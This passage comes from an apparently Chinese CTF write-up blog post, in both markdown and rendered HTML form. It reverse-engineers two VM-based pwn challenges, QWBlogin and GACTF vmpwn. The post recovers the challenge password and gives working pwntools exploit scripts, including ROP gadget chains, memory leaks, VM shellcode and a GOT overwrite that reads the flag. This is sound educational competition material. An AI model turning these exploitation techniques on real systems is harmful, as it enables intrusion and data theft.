0xc, 0xd, 0xe, \n        4\n    case 0x01, 0x02, 0x03, 0x04,\n        0xb\n    case 0x5:\n        0x15: int8_t 4\n        0x25: int16_t 5\n        0x35: int32_t 7\n        0x45: int64_t 0xb \n    case 0x6:\n        3\n    case 0x7:\n        0x17: int8_t 3\n        0x27: int16_t 4\n        0x37: int32_t 6\n        0x47: int64_t 10\n    case 0x8:\n        if op[0] == 0x20:\n            2\n        else:\n            10\n    case 0x9:\n        if op[0] != 0x20 && a[0x14] - a[0x12] < 10\n            return 1;\n    case 0xa:\n        2\n    default:\n        return 1;\n```\n\n\n\n#### 思考\n\n在最开始的时候傻乎乎的顺着`dump`的函数逆，后来逆完`MOV`之后觉得其中`MUL/DIV/MOD`等一些内容都可以不用逆，然后我让一个学弟帮忙逆`XOR/OR/AND`等一些其他的，我去逆`JMP`这整个，后来觉得这个思路错了，其实如果`test.bin`的程序并没有自我修改的话，其实可以先根据`size`和`instrcution`把指令分了，再看是否需要逆一些指令，最后发现只有`mov pop push call ret jmp（中间少部分）syacall`需要很清楚的逆出来，其他的都可以不用逆。\n\n\n\n#### 整理\n\n最后需要的每个的情况都整理成如下模式\n\n```python\n# 20_syscall.c\nswitch op[0]:\n\n// SYSCALL\n// size == 2\ncase 0x20:\n    r00 == 0\n        op[1] == 0xa\n        \n        fd = open(data[r01], r02)\n        insert fd into vm.io_file\n\n    r00 == 1\n        op[1]&0xf == 0x8:\n            read(r01, data[r02], r03)\n\n        op[1]&0xf == 0x9\n            read(r01, stack[r02], r03)\n\n    r00 == 2\n        op[1]&0xf == 0x8:\n            write(r01, data[r02], r03)\n        \n        op[1]&0xf == 0x9:\n            write(r01, stack[r02], r03)\n\n    r00 == 3\n        close(r01)\n```\n\n\n\n#### 简易 emulator\n\n最后根据整理的`op[0] op[1]`进行编写简易的分开`test.bin`的程序\n\n```\nov r0, qword 0x45\ncall 0x45 0x1 0x53\nmov r1, qword 0xa756f5920656553\npush qword r1\nmov r0, qword 0x2\nmov r1, qword 0x1\nmov qword r2, r16\nmov r3, qword 0x8\nsyscall stack\nhlt\nmov r0, byte 0x2\nmov r1, byte 0x1\nmov r2, byte 0\nmov r3, byte 0x23\nsyscall data\nmov r0, byte 0x2\nmov r1, byte 0x1\nmov r2, byte 0x28\nmov r3, byte 0xb\nsyscall data\nmov r0, byte 0x1\nmov r1, byte 0\nmov r2, dword 0x40\nmov r3, qword 0x1\nsyscall data\nmov r8, byte ptr data[0x40]\ncmp r8, byte 0x51\t\t\t\t|Q\nje 0x2\nhlt\nmov r0, byte 0x1\nmov r1, byte 0\nmov r2, byte 0x40\nmov r3, byte 0x1\nsyscall data\nmov r8, byte ptr data[0x40]\ncmp r8, byte 0x57\t\t\t\t| W\njne 0x3\njmp 0x2\nhlt\nmov qword ptr data[0x40], r9\nmov r0, byte 0x1\nmov r1, word 0\nmov r2, word 0x40\nmov r3, byte 0x1\nsyscall data\nmov r8, byte ptr data[0x40]\nxor r8, byte 0x77\ncmp r8, byte 0x26\t\t\t\t| Q\njne 0xffffffc9\nmov qword ptr data[0x40], r9\nmov qword ptr data[0x48], r9\nmov qword ptr data[0x50], r9\nmov qword ptr data[0x58], r9\nmov qword ptr data[0x60], r9\nmov r0, byte 0x1\nmov r1, word 0\nmov r2, word 0x40\nmov r3, byte 0x21\nsyscall data\t\t\t\t\t| read(0, data[0x40], 0x21)\nxor qword r8, r8\nmov r8, qword ptr data[0x40]\t| G00DR3VR\nmov r9, qword 0x427234129827abcd\nxor qword r8, r9\ncmp r8, qword 0x10240740dc179b8a\nje 0x2\nhlt\nxor qword r8, r8\nmov r8, qword ptr data[0x48]\t| W31LD0N3\nmov r9, qword 0x127412341241dead\nxor qword r8, r9\ncmp r8, qword 0x213a22705e70edfa\nje 0x2\nhlt\nxor qword r8, r8\nmov r8, qword ptr data[0x50]\t| Try2Pwn!\nmov r9, qword 0x8634965812abc123\nxor qword r8, r9\ncmp r8, qword 0xa75ae10820d2b377\nje 0x2\nhlt\nxor qword r8, r8\nmov r8, qword ptr data[0x58]\t| GOGOGOGO\nmov r9, qword 0x123216781236789a\nxor qword r8, r9\ncmp r8, qword 0x5d75593f5d7137dd\nje 0x2\nhlt\nmov r0, byte 0x2\nmov r1, byte 0x1\nmov r2, byte 0x34\nmov r3, byte 0x6\nsyscall data\npush qword r17\nmov qword r17, r16\nsub r16, qword 0x100\nmov qword r4, r16\nmov r5, qword 0xa214f474f4721\npush qword r5\nmov r5, qword 0x574f4e54494e5750\npush qword r5\nmov qword r5, r16\nmov r0, byte 0x2\nmov r1, byte 0x1\nmov qword r2, r16\nmov r3, byte 0xf\nsyscall stack\nmov r0, byte 0x1\nmov r1, byte 0\nmov qword r2, r4\nmov r3, qword 0x800\nsyscall stack\t\t\t\t\t| read(0, stack[], 0x800)\ncmp r0, qword 0         \njnl 0x2\nhlt\nmov qword r3, r0\nmov r1, byte 0x1\nmov qword r2, r4\nmov r0, qword 0x2\nmov qword r16, r17      \npop qword r17\nret\n```\n\n于是程序就比较清晰了，如果输入了`password`为`QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO`就能走到最后溢出的地方\n\n最后在`read(0, stack, 0x800)`的地方会出现溢出，然后在`ret`的时候把栈上的内容`pop`到`vm.pc`，于是就需要在`test.bin`里面找到可以用`gadgets`\n\n\n\n### pwn\n\n#### gadgets\n\n在程序`RET`之后还有一大段无关的`opcode`，做到这步的时候才知道，这些就是为了凑`gadgets`的\n\n其中标记为`R`的是不需要限制的\n\n```python\n# 0x0d 0xR6 0x00 0x11 0xRR\npop_r00_ret = 0x2f5         # 0x46\n# 0x0d 0xR6 0x01 0X11 0xRR\npop_r01_ret = 0x377         # 0x46\n# 0x0d 0xR6 0x02 0x11 0xRR\npop_r02_ret = 0x45c         # 0x46\n# 0x0d 0xR6 0x03 0x11 0xRR\npop_r03_ret = 0x4e1         # 0x46\n\n# 0x20 0x0a 0x11 0xRR\nsys_open_ret = 0x6ed\n# 0x20 0xR8 0x11 0xRR\nsys_data_ret = 0x5b1\n# 0x20 0xR9 0x11 0xRR\nsys_stack_ret = 0x617\n```\n\n\n\n#### exp\n\n由于`syscall`中只有`open | read | write | close`可用，很自然想到`orw`，然后构造`rop`链就行了，其中由于最开始打开了`test.bin`文件，所以`fd=4`，最初写`exp`的时候被坑了一下，以及调试的时候希望能有结构体的符号，我编译了`struct.c => struct.o`再在调试的时候`add-symbol-file struct.o 0`即可\n\n\n\n```python\npayload = b\"A\"*0x108\n# read(0, data[0x100], 0x20)\n# r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20\npayload += p64(pop_r00_ret) + p64(1) + p64(pop_r01_ret) + p64(0) + p64(pop_r02_ret) + p64(0x100) + p64(pop_r03_ret) + p64(0x20)\npayload += p64(sys_data_ret)\n\n# open(data[0x100], 0)\n# r00 = 0 r01 = 0x200 r02 = 0\npayload += p64(pop_r00_ret) + p64(0) + p64(pop_r01_ret) + p64(0x100) + p64(pop_r02_ret) + p64(0)\npayload += p64(sys_open_ret)\n\n# read(4, data[0x100], 0x30)\n# r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30\npayload += p64(pop_r00_ret) + p64(1) + p64(pop_r01_ret) + p64(0x4) + p64(pop_r02_ret) + p64(0x100) + p64(pop_r03_ret) + p64(0x30)\npayload += p64(sys_data_ret)\n\n# write(1, data[0x100], 0x30)\n# r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30\npayload += p64(pop_r00_ret) + p64(2) + p64(pop_r01_ret) + p64(0x1) + p64(pop_r02_ret) + p64(0x100) + p64(pop_r03_ret) + p64(0x30)\npayload += p64(sys_data_ret)\n```\n\n\n\n强的大佬，不需要`instruction.h`都能在5个小时内做出来，而我就是只菜鸡\n\n[QWBlogin 题目](<https://github.com/Vang3lis/CTF_repo/tree/master/QWB_2020/QWBlogin>)\n\n\n\n## VMpwn\n\n这个题目跟上一个题目一样先逆向，但是这个题目跟`QWBlogin`相比实现`vm`的时候简单一些\n\n其中有一个 `chunk 0x30`用来记录寄存器的值`vm[0] vm[1] vm[2]` 类似`rdi, rsi, rdx`在`syscall`时会用到，`vm[3]`为`sp`，`vm[5]`为 `pc`\n\n在最后的关键操作为对于`read(0, stack, 0x1000)`（栈只有`0x100`个字节）\n\n```assembly\npwndbg> distance 0x555555759050 0x55555575ad68\n0x555555759050->0x55555575ad68 is 0x1d18 bytes (0x3a3 words)\n\n RAX  0x7ffff7b156c0 (read) ◂— cmp    dword ptr [rip + 0x2c3039], 0\n ► 0x5555555555db    call   rax <0x7ffff7b156c0>\n        fd: 0x0\n        buf: 0x55555575ad68 ◂— 0x0\n        nbytes: 0x1000\n\npwndbg> telescope 0x555555758010\n00:0000│   0x555555758010 ◂— 0x0\n01:0008│   0x555555758018 —▸ 0x55555575ad68 ◂— 0x0\n02:0010│   0x555555758020 ◂— 0x1000\n03:0018│   0x555555758028 —▸ 0x55555575ad68 ◂— 0x0\n04:0020│   0x555555758030 ◂— 0x0\n05:0028│   0x555555758038 —▸ 0x5555557572d6 ◂— 0x772c6b6f11028f10\n```\n\n然后`puts(stack)`，可以看到该虚拟栈上有`heap`地址和`elf`地址，但是只能泄漏一个\n\n```assembly\npwndbg> telescope 0x55555575ad68 0x30\n00:0000│ rsi  0x55555575ad68 ◂— '1234454636\\n'\n01:0008│      0x55555575ad70 ◂— 0xa3633 /* '36\\n' */\n02:0010│      0x55555575ad78 ◂— 0x0\n... ↓\n1e:00f0│      0x55555575ae58 —▸ 0x555555758050 ◂— 0x20746168772c6b6f ('ok,what ')\n1f:00f8│      0x55555575ae60 ◂— 0x0\n20:0100│      0x55555575ae68 —▸ 0x555555757851 ◂— 0xff\n```\n\n接下来同第一步的`read(0, stack, 0x1000)` `write(0, stack, 0x20)`然后`ret`\n\n\n\n这个程序中有一个两个比较奇怪的地方，由于`ret`的时候程序的实现，是将`sp-=8`，但是`PUSH`为`sp-=8` `POP`为`sp+=8`，因此`ret`的时候比较奇怪，另外就是与`QWBlogin`相比没有 什么能用的`gadget`，因此想法只能为按照`vm`的规则，写`shellocde`，然后在最后`ret`的时候跳转过去，但是该题用 `seccomp`限制了只能 `orw`，且没有给`open`的 `syscall`只能泄漏\n\n### 思路\n\n因此思路就是，先利用`puts`泄漏`elf`的地址，然后再`ret`到最初`elf_code+0x3`然后再泄漏`heap`，`ret`到写入栈上的`shellcode`\n\n利用`puts`泄漏`libc`，然后再次输入到栈上，利用`\\x6d: mov reg[0], 0`作为`nop`，编写`shellcode`\n\n然后将`open`写入`free`的位置，因此在调用`syscall 03`时就是调用`open`，最后利用`orw`进行读取`flag`\n\n### exp\n\n```python\n# heap+0x2e68 => elf_bss\n\nio.sendafter(\"name:\", \"A\"*0xff+\"#\")\n\nio.recvuntil(\"#\")\nelf.address = u64(io.recvn(6) + \"\\x00\\x00\") - 0x203851\nsuccess(\"elf\", elf.address)\n\n\n# 0xf8 + ret \nio.sendafter(\"say:\", \"A\"*0x100 + p64(elf.address + 0x203023))\n\nio.sendafter(\"name:\", \"\\x50\")\nheap = u64(io.recvn(6) + \"\\x00\\x00\") - 0x50\nsuccess(\"heap\", heap)\n\n'''\nmov reg[0], read_got\nputs\nmov reg[0], 0\nmov reg[1], heap + addr\nmov reg[2], 0x1000\nread        \n//  use 0x6d: mov reg[0], 0 as nop\n'''\n\npayload = \"\\x11\" + p64(elf.got['read'])\npayload += \"\\x8f\\x02\"\npayload += \"\\x6d\"\npayload += \"\\x12\" + p64(heap+0x2d60)\npayload += \"\\x13\" + p64(0x1000)\npayload += \"\\x8f\\x00\"\npayload = payload.ljust(0x100, \"A\")\npayload += p64(heap+0x2d60)\nio.sendafter(\"say:\", payload)\n\nio.recvuntil(\"bye~\\n\")\n\nlibc.address = u64(io.recvuntil(\"\\n\", drop=True).ljust(8, \"\\x00\")) - libc.sym['read']\n\n'''\nflag\n0x6d * 0x50\nmov reg[1], elf.address+0x203900\nmov reg[2], 8\nread\nmov reg[0], heap+0x2d60\nmov reg[1], 0\nopen\nmov reg[0], 3\nmov reg[1], bss\nmov reg[2], 0x30\nread\nmov reg[0], 1\nmov reg[1], bss\nmov reg[2], 0x30\nwrite\n'''\n\npayload = \"flag\\x00\"\npayload = payload.ljust(0x50, \"\\x6d\")\npayload += \"\\x12\" + p64(elf.address+0x2038f8)\npayload += \"\\x13\" + p64(8)\npayload += \"\\x8f\\x00\"\npayload += \"\\x11\" + p64(heap+0x2d60)\npayload += \"\\x6e\"\npayload += \"\\x8f\\x03\"\npayload += \"\\x11\" + p64(3)\npayload += \"\\x12\" + p64(elf.bss()+0x400)\npayload += \"\\x13\" + p64(0x30)\npayload += \"\\x8f\\x00\"\npayload += \"\\x11\" + p64(1)\npayload += \"\\x12\" + p64(elf.bss()+0x400)\npayload += \"\\x13\" + p64(0x30)\npayload += \"\\x8f\\x01\"\n\nio.send(payload)\n\nsleep(0.03)\n\nio.send(p64(libc.sym['open']))\n\nio.interactive()\nio.close()\n\n```\n\n","slug":"qwblogin & GACTF vmpwn","updated":"2020-09-02T03:50:44.453Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckekurjvc0001bxxndvtpcc7z","content":"<p>强网杯的一个虚拟机的题目，之前做过虚拟机的题目但是都没做出来，这次打比赛的时候由于有其他的事情，就做了一点就没做了，然后今天把这个题目磨出来了。</p>\n<p>打完 <code>GACTF2020</code> 之后把其中的<code>vmpwn</code>也添加在此</p>\n<h2 id=\"QWBlogin\"><a href=\"#QWBlogin\" class=\"headerlink\" title=\"QWBlogin\"></a>QWBlogin</h2><p>该题给了一个 <code>emulator</code>虚拟机，运行的类似机器码的<code>test.bin</code>和<code>launch.sh</code>，之后<code>tips</code>的时候给了<code>Instruction.h</code></p>\n<h3 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h3><h4 id=\"main-函数\"><a href=\"#main-函数\" class=\"headerlink\" title=\"main 函数\"></a>main 函数</h4><p>基本上程序运行依靠一个虚拟机的结构体，可以从<code>main</code>里面看到就是 <code>v9</code>结构体，后文会将介绍该结构体</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">int</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">int</span> argc, <span class=\"hljs-keyword\">char</span>** argv)</span></span>\n<span class=\"hljs-function\"></span>&#123;\n    len = sub_ba0(argv[<span class=\"hljs-number\">1</span>]);\n    <span class=\"hljs-keyword\">if</span>(len &lt;= <span class=\"hljs-number\">0</span>)\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">0</span>);\n    \n    fd = open(argv[<span class=\"hljs-number\">1</span>], <span class=\"hljs-number\">0</span>);\n    <span class=\"hljs-keyword\">if</span>(fd &lt; <span class=\"hljs-number\">0</span>)\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">0</span>);\n    \n    v8 = mmap(<span class=\"hljs-number\">0</span>, len, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, fd, <span class=\"hljs-number\">0</span>);\n    <span class=\"hljs-keyword\">if</span>(!v8)\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">0</span>);\n    \n    <span class=\"hljs-comment\">// check image format</span>\n    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-built_in\">memcmp</span>(v8, <span class=\"hljs-string\">&quot;\\x61\\xde\\x10\\ef&quot;</span>, <span class=\"hljs-number\">4</span>))\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">2</span>);\n    \n    <span class=\"hljs-comment\">// check lenth</span>\n    <span class=\"hljs-comment\">// segment?</span>\n\n    <span class=\"hljs-comment\">// v8[6, 14) ~ [14, 22) lenth</span>\n    <span class=\"hljs-keyword\">if</span>( *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">6</span>) &gt; len || *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">14</span>) &gt; len - *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">6</span>) )\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">3</span>);\n    \n    <span class=\"hljs-comment\">// v8[22, 30) ~ [30, 38)</span>\n    <span class=\"hljs-keyword\">if</span>( *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">22</span>) &gt; len || *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">30</span>) &gt; len - *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">22</span>) )\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">4</span>);\n\n    <span class=\"hljs-comment\">// v[38, 46) &gt; v8[14, 22)</span>\n    <span class=\"hljs-keyword\">if</span>( *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">38</span>) &gt;= *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">14</span>) ) \n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">5</span>);\n\n    v9 = <span class=\"hljs-built_in\">calloc</span>(<span class=\"hljs-number\">0xD0</span>, <span class=\"hljs-number\">1</span>);\n    <span class=\"hljs-comment\">// v[6, 14) == offset v&#123;14, 22) == segment_size</span>\n    <span class=\"hljs-comment\">// v9[21] = calloc(1, v8[14, 22)) 0x1000 向上取整</span>\n    v9[<span class=\"hljs-number\">21</span>] = <span class=\"hljs-built_in\">calloc</span>(<span class=\"hljs-number\">1</span>, v8[<span class=\"hljs-number\">14</span>, <span class=\"hljs-number\">22</span>))\n    <span class=\"hljs-built_in\">memcpy</span>(v9[<span class=\"hljs-number\">21</span>], &amp;(v8[v8[<span class=\"hljs-number\">6</span>, <span class=\"hljs-number\">14</span>)]),  v8[<span class=\"hljs-number\">14</span>, <span class=\"hljs-number\">22</span>))\n    v[<span class=\"hljs-number\">20</span>] = segment_size;\n\n    <span class=\"hljs-comment\">// </span>\n    v9[<span class=\"hljs-number\">23</span>] = <span class=\"hljs-built_in\">calloc</span>(<span class=\"hljs-number\">1</span>, v8[<span class=\"hljs-number\">30</span>, <span class=\"hljs-number\">38</span>))\n    <span class=\"hljs-built_in\">memcpy</span>(v9[<span class=\"hljs-number\">23</span>], &amp;(v8[v8[<span class=\"hljs-number\">22</span>, <span class=\"hljs-number\">30</span>)]), v8[<span class=\"hljs-number\">30</span>, <span class=\"hljs-number\">38</span>))\n    v9[<span class=\"hljs-number\">22</span>] = segment_size; \n\n    v9[<span class=\"hljs-number\">25</span>] = <span class=\"hljs-built_in\">calloc</span>(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0x20</span> <span class=\"hljs-number\">000</span>);\n    v9[<span class=\"hljs-number\">24</span>] = <span class=\"hljs-number\">0x20</span> <span class=\"hljs-number\">000</span>;\n    v9[<span class=\"hljs-number\">18</span>] = v8[<span class=\"hljs-number\">38</span>, <span class=\"hljs-number\">46</span>)\n\n    g_Var = <span class=\"hljs-built_in\">calloc</span>(<span class=\"hljs-number\">0x18</span>, <span class=\"hljs-number\">1</span>);\n    <span class=\"hljs-built_in\">memset</span>(g_Var, <span class=\"hljs-number\">0x18</span>, <span class=\"hljs-number\">0</span>);\n\n    <span class=\"hljs-comment\">//链表结构 可能记录 segment flag 的</span>\n    <span class=\"hljs-comment\">// g_Var[0x10, 0x18) -&gt; struct_18 -&gt; struct_18;</span>\n    \n          \n    <span class=\"hljs-keyword\">while</span>(!sub_c1a(v9))\n    &#123;&#125;\n&#125;</code></pre>\n\n<p>然后进入<code>c1a</code>结构体的时候，会发现<code>IDA</code>报出该函数太大无法分析，只能另外用<code>Ghidra</code>看能不能分析，然后发现能够反编译，于是对其进行<code>dump</code>反编译的文本进行分析</p>\n<h4 id=\"VM-struct\"><a href=\"#VM-struct\" class=\"headerlink\" title=\"VM struct\"></a>VM struct</h4><p>其中关键的结构体被逆出来是如下</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">VM</span></span>\n<span class=\"hljs-class\">&#123;</span>\n    <span class=\"hljs-keyword\">int64_t</span> r00;\n    <span class=\"hljs-keyword\">int64_t</span> r01;\n    <span class=\"hljs-keyword\">int64_t</span> r02;\n    <span class=\"hljs-keyword\">int64_t</span> r03;\n    <span class=\"hljs-keyword\">int64_t</span> r04;\n    <span class=\"hljs-keyword\">int64_t</span> r05;\n    <span class=\"hljs-keyword\">int64_t</span> r06;\n    <span class=\"hljs-keyword\">int64_t</span> r07;\n    <span class=\"hljs-keyword\">int64_t</span> r08;\n    <span class=\"hljs-keyword\">int64_t</span> r09;\n    <span class=\"hljs-keyword\">int64_t</span> r0a;\n    <span class=\"hljs-keyword\">int64_t</span> r0b;\n    <span class=\"hljs-keyword\">int64_t</span> r0c;\n    <span class=\"hljs-keyword\">int64_t</span> r0d;\n    <span class=\"hljs-keyword\">int64_t</span> r0e;\n    <span class=\"hljs-keyword\">int64_t</span> r0f;\n    <span class=\"hljs-keyword\">int64_t</span> r10;\n    <span class=\"hljs-keyword\">int64_t</span> r11;\n    <span class=\"hljs-keyword\">int64_t</span> pc;             <span class=\"hljs-comment\">// vm[0x12]</span>\n    <span class=\"hljs-keyword\">int64_t</span> flags;          <span class=\"hljs-comment\">// vm[0x13]</span>\n    <span class=\"hljs-keyword\">int64_t</span> text_size;      <span class=\"hljs-comment\">// vm[0x14]</span>\n    <span class=\"hljs-keyword\">int64_t</span> text_segment;   <span class=\"hljs-comment\">// vm[0x15]</span>\n    <span class=\"hljs-keyword\">int64_t</span> data_size;      <span class=\"hljs-comment\">// vm[0x16]</span>\n    <span class=\"hljs-keyword\">int64_t</span> data_segment;   <span class=\"hljs-comment\">// vm[0x17]</span>\n    <span class=\"hljs-keyword\">int64_t</span> io_file;        <span class=\"hljs-comment\">// 0x18 struct (int_no=0) -&gt; 0x18 (int_no=1) -&gt; 0x18 (int_no=2)</span>\n    <span class=\"hljs-keyword\">int64_t</span> <span class=\"hljs-built_in\">stack</span>;          <span class=\"hljs-comment\">// vm[0x19]</span>\n    <span class=\"hljs-comment\">// int64_t </span>\n&#125;;</code></pre>\n\n<p>前面是寄存器，后面是一些段和存储的<code>io_file</code>链和虚拟的栈</p>\n<h4 id=\"op-1\"><a href=\"#op-1\" class=\"headerlink\" title=\"op[1]\"></a>op[1]</h4><p>在<code>0xc1a</code>程序的开始先会判断当前<code>op</code>是否<code>&lt;2</code>如果<code>&lt;2</code>则退出，说明每一个指令至少都有两个字节，之后用了<code>op[1]&amp;0xf</code>进行<code>switch case</code>判断当前指令长度</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-keyword\">switch</span> op[<span class=\"hljs-number\">1</span>]&amp;<span class=\"hljs-number\">0xf</span>\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x0b</span>, <span class=\"hljs-number\">0xc</span>, <span class=\"hljs-number\">0xd</span>, <span class=\"hljs-number\">0xe</span>, \n        <span class=\"hljs-number\">4</span>\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x02</span>, <span class=\"hljs-number\">0x03</span>, <span class=\"hljs-number\">0x04</span>,\n        <span class=\"hljs-number\">0xb</span>\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x5</span>:\n        <span class=\"hljs-number\">0x15</span>: <span class=\"hljs-keyword\">int8_t</span> <span class=\"hljs-number\">4</span>\n        <span class=\"hljs-number\">0x25</span>: <span class=\"hljs-keyword\">int16_t</span> <span class=\"hljs-number\">5</span>\n        <span class=\"hljs-number\">0x35</span>: <span class=\"hljs-keyword\">int32_t</span> <span class=\"hljs-number\">7</span>\n        <span class=\"hljs-number\">0x45</span>: <span class=\"hljs-keyword\">int64_t</span> <span class=\"hljs-number\">0xb</span> \n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x6</span>:\n        <span class=\"hljs-number\">3</span>\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x7</span>:\n        <span class=\"hljs-number\">0x17</span>: <span class=\"hljs-keyword\">int8_t</span> <span class=\"hljs-number\">3</span>\n        <span class=\"hljs-number\">0x27</span>: <span class=\"hljs-keyword\">int16_t</span> <span class=\"hljs-number\">4</span>\n        <span class=\"hljs-number\">0x37</span>: <span class=\"hljs-keyword\">int32_t</span> <span class=\"hljs-number\">6</span>\n        <span class=\"hljs-number\">0x47</span>: <span class=\"hljs-keyword\">int64_t</span> <span class=\"hljs-number\">10</span>\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x8</span>:\n        <span class=\"hljs-keyword\">if</span> op[<span class=\"hljs-number\">0</span>] == <span class=\"hljs-number\">0x20</span>:\n            <span class=\"hljs-number\">2</span>\n        <span class=\"hljs-keyword\">else</span>:\n            <span class=\"hljs-number\">10</span>\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x9</span>:\n        <span class=\"hljs-keyword\">if</span> op[<span class=\"hljs-number\">0</span>] != <span class=\"hljs-number\">0x20</span> &amp;&amp; a[<span class=\"hljs-number\">0x14</span>] - a[<span class=\"hljs-number\">0x12</span>] &lt; <span class=\"hljs-number\">10</span>\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0xa</span>:\n        <span class=\"hljs-number\">2</span>\n    <span class=\"hljs-keyword\">default</span>:\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;</code></pre>\n\n\n\n<h4 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h4><p>在最开始的时候傻乎乎的顺着<code>dump</code>的函数逆，后来逆完<code>MOV</code>之后觉得其中<code>MUL/DIV/MOD</code>等一些内容都可以不用逆，然后我让一个学弟帮忙逆<code>XOR/OR/AND</code>等一些其他的，我去逆<code>JMP</code>这整个，后来觉得这个思路错了，其实如果<code>test.bin</code>的程序并没有自我修改的话，其实可以先根据<code>size</code>和<code>instrcution</code>把指令分了，再看是否需要逆一些指令，最后发现只有<code>mov pop push call ret jmp（中间少部分）syacall</code>需要很清楚的逆出来，其他的都可以不用逆。</p>\n<h4 id=\"整理\"><a href=\"#整理\" class=\"headerlink\" title=\"整理\"></a>整理</h4><p>最后需要的每个的情况都整理成如下模式</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># 20_syscall.c</span>\nswitch op[<span class=\"hljs-number\">0</span>]:\n\n// SYSCALL\n// size == <span class=\"hljs-number\">2</span>\ncase <span class=\"hljs-number\">0x20</span>:\n    r00 == <span class=\"hljs-number\">0</span>\n        op[<span class=\"hljs-number\">1</span>] == <span class=\"hljs-number\">0xa</span>\n        \n        fd = open(data[r01], r02)\n        insert fd into vm.io_file\n\n    r00 == <span class=\"hljs-number\">1</span>\n        op[<span class=\"hljs-number\">1</span>]&amp;<span class=\"hljs-number\">0xf</span> == <span class=\"hljs-number\">0x8</span>:\n            read(r01, data[r02], r03)\n\n        op[<span class=\"hljs-number\">1</span>]&amp;<span class=\"hljs-number\">0xf</span> == <span class=\"hljs-number\">0x9</span>\n            read(r01, stack[r02], r03)\n\n    r00 == <span class=\"hljs-number\">2</span>\n        op[<span class=\"hljs-number\">1</span>]&amp;<span class=\"hljs-number\">0xf</span> == <span class=\"hljs-number\">0x8</span>:\n            write(r01, data[r02], r03)\n        \n        op[<span class=\"hljs-number\">1</span>]&amp;<span class=\"hljs-number\">0xf</span> == <span class=\"hljs-number\">0x9</span>:\n            write(r01, stack[r02], r03)\n\n    r00 == <span class=\"hljs-number\">3</span>\n        close(r01)</code></pre>\n\n\n\n<h4 id=\"简易-emulator\"><a href=\"#简易-emulator\" class=\"headerlink\" title=\"简易 emulator\"></a>简易 emulator</h4><p>最后根据整理的<code>op[0] op[1]</code>进行编写简易的分开<code>test.bin</code>的程序</p>\n<pre><code class=\"hljs x86asm\">ov <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x45</span>\n<span class=\"hljs-keyword\">call</span> <span class=\"hljs-number\">0x45</span> <span class=\"hljs-number\">0x1</span> <span class=\"hljs-number\">0x53</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0xa756f5920656553</span>\n<span class=\"hljs-keyword\">push</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r2</span>, r16\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x8</span>\n<span class=\"hljs-keyword\">syscall</span> stack\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span 